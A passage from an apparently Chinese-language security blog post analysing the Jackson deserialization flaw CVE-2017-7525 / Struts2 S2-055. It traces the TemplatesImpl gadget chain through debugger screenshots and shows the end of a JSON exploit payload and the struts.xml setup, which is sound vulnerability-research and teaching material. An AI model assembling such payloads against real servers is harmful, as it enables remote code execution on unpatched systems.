QAaAAAAAgAb&quot;],&quot;transletName&quot;:&quot;a.b&quot;,&quot;outputProperties&quot;:&#123;&#125;&#125;]&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-19.20.33.36-image.png" alt="2019-05-19.20.33.36-image.png"></p>
<p>POP漏洞链：<code>getOutputProperties()--newTransformer()--getTransletInstance()--newInstance()</code></p>
<p>关于执行<code>getOutputProperties()</code>之后的调用链我们在Fastjson中已经分析过，我们在这里只比较下有什么不同:<br><strong>1.Fastjson中使用parseObject()的过程最后会Json.tojson(),调用属性的getter方法，但是在Jackson的反序列化过程中不会默认调用getter方法</strong></p>
<blockquote>
<p>Jackson在解析<code>outputProperties</code>属性时，在<code>TemplatesImpl</code>类中<br>找见其getter方法(<code>getOutputProperties</code>)而并未<br>找见其<code>setOutputProperties()</code>与<code>outputProperties</code>(类中为<code>_outputProperties</code>,不对应)成员变量，就会调用类<code>SetterlessProperty</code>的<code>deserializeAndSet()</code>方法，这个方法去调用getter方法</p>
</blockquote>
<p>首先在<code>struts.xml</code>添加配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean type=&quot;org.apache.struts2.rest.handler.ContentTypeHandler&quot; name=&quot;jackson&quot; class=&quot;org.apache.struts2.rest.handler.JacksonLibHandler&quot;/&gt;</span><br><span class="line">    &lt;constant name=&quot;struts.rest.handlerOverride.json&quot; value=&quot;jackson&quot;/&gt;</span><br></pre></td></tr></table></figure></p>
<p>表示Content-type为<code>application/json</code>都会交给<code>JacksonLibHandler</code>处理。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-22.09.22.54-image.png" alt="2019-05-22.09.22.54-image.png"></p>
<p>由于在Struts2中默认不会开启<code>Default Typing</code>，所以我们使用注解方式启动多态类型绑定</p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-22.09.24.51-image.png" alt="2019-05-22.09.24.51-image.png"></p>
<p><code>BeanPropertyMap</code>的<code>init()</code>最后一行下个断点<br>Jackson首先解析Order，得到变量对应方法:</p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-20.20.57.09-image.png" alt="2019-05-20.20.57.09-image.png"></p>
<p>设置<code>clientName</code>的值<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-20.20.59.52-image.png" alt="2019-05-20.20.59.52-image.png"></p>
<p>因为<code>clientName</code>的值包含类，所以首先去解析目标类<code>TemplatesImpl</code>，得到类变量与对应方法<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-20.20.48.42-image.png" alt="2019-05-20.20.48.42-image.png"></p>
<p>开始解析传入的3个变量，当解析<code>transletBytecodes</code>时</p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-19.22.00.30-image.png" alt="2019-05-19.22.00.30-image.png"></p>
<p>判断为array(<code>[</code>符号),调用<code>deserializeWithType()</code><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-19.22.03.26-image.png" alt="2019-05-19.22.03.26-image.png"></p>
<p>这里会对传入的<code>transletBytecodes</code>的值进行base64解码<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-20.21.20.24-image.png" alt="2019-05-20.21.20.24-image.png"></p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-20.21.23.04-image.png" alt="2019-05-20.21.23.04-image.png"></p>
<p>所以再次传入时要将内容做一次base64编码。<br>然后返回<code>MethodProperty#deserializeAndSet()</code>调用setter方法进行赋值</p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-19.22.12.52-image.png" alt="2019-05-19.22.12.52-image.png"></p>
<p>之后解析<code>transletName</code>，也是调用setter方法赋值<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-19.22.14.56-image.png" alt="2019-05-19.22.14.56-image.png"></p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-19.22.16.40-image.png" alt="2019-05-19.22.16.40-image.png"></p>
<p>最后解析到变量<code>outputProperties</code></p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-19.21.43.45-image.png" alt="2019-05-19.21.43.45-image.png"></p>
<p>判断为Object(<code>{</code>符号)<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-19.22.19.31-image.png" alt="2019-05-19.22.19.31-image.png"></p>
<p>之后就调用<code>getOutputProperties()</code>方法触发POP链。</p>
<h2 id="防御与检测"><a href="#防御与检测" class="headerlink" title="防御与检测"></a>防御与检测</h2><p>最重要的防御就是升级到最新版</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/vulhub/vulhub/tree/master/jackson/CVE-2017-7525" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/jackson/CVE-2017-7525</a></p>
<p><a href="http://xxlegend.com/2017/12/06/S2-055%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://xxlegend.com/2017/12/06/S2-055%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%88%86%E6%9E%90/</a><br><a href="http://www.leadroyal.cn/?p=616" target="_blank" rel="noopener">http://www.leadroyal.cn/?p=616</a><br><a href="https://blog.csdn.net/m0_38043244/article/details/72833064" target="_blank" rel="noopener">https://blog.csdn.net/m0_38043244/article/details/72833064</a><br><a href="https://bbs.pediy.com/thread-218416.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-218416.htm</a></p>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="../../../../index.html">Home</a></li>
         
          <li><a href="../../../../about.html">About</a></li>
         
          <li><a href="../../../../archives/">Writing</a></li>
         
          <li><a href="../../../../friends.html">Friends</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Jackjson基础"><span class="toc-number">1.</span> <span class="toc-text">Jackjson基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基本用法"><span class="toc-number">1.1.</span> <span class="toc-text">基本用法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#为什么会在反序列化时执行代码"><span class="toc-number">2.</span> <span class="toc-text">为什么会在反序列化时执行代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Jackson的多态类型绑定"><span class="toc-number">2.1.</span> <span class="toc-text">Jackson的多态类型绑定</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#全局Default-Typing机制"><span class="toc-number">2.1.1.</span> <span class="toc-text">全局Default Typing机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用JsonTypeInfo注解"><span class="toc-number">2.1.2.</span> <span class="toc-text">使用JsonTypeInfo注解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#总结"><span class="toc-number">2.1.3.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2017-7525-amp-amp-S2-055"><span class="toc-number">3.1.</span> <span class="toc-text">CVE-2017-7525 &amp;&amp; S2-055</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#条件"><span class="toc-number">3.1.1.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#分析"><span class="toc-number">3.1.2.</span> <span class="toc-text">分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御与检测"><span class="toc-number">4.</span> <span class="toc-text">防御与检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/&text=Jackson反序列化CVE-2017-7525"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/&title=Jackson反序列化CVE-2017-7525"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/&is_video=false&description=Jackson反序列化CVE-2017-7525"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Jackson反序列化CVE-2017-7525&body=Check out this article: http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/&title=Jackson反序列化CVE-2017-7525"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/&title=Jackson反序列化CVE-2017-7525"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/&title=Jackson反序列化CVE-2017-7525"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/&title=Jackson反序列化CVE-2017-7525"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/05/16/Jackson反序列化CVE-2017-7525/&name=Jackson反序列化CVE-2017-7525&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> 目录</a></li>
        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a></li>
        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> 顶部</a></li>
        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> 菜单</a></li>
      </ul>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    版权所有 &copy; 2019 P0rZ9
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about.html">About</a></li><li><a href="../../../../archives/">Writing</a></li><li><a href="../../../../friends.html">Friends</a></li>
      </ul>
    </nav>
  </div>
</footer>



</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="../../../../lib/font-awesome/css/font-awesome.min.css">
<link rel="stylesheet" href="../../../../lib/meslo-LG/styles.css">
<link rel="stylesheet" href="../../../../lib/justified-gallery/justifiedGallery.min.css">


<!-- jquery -->
<script src="../../../../lib/jquery/jquery.min.js"></script>
<script src="../../../../lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
<script src="../../../../js/main.js"></script>
<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-86660611-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Disqus Comments -->


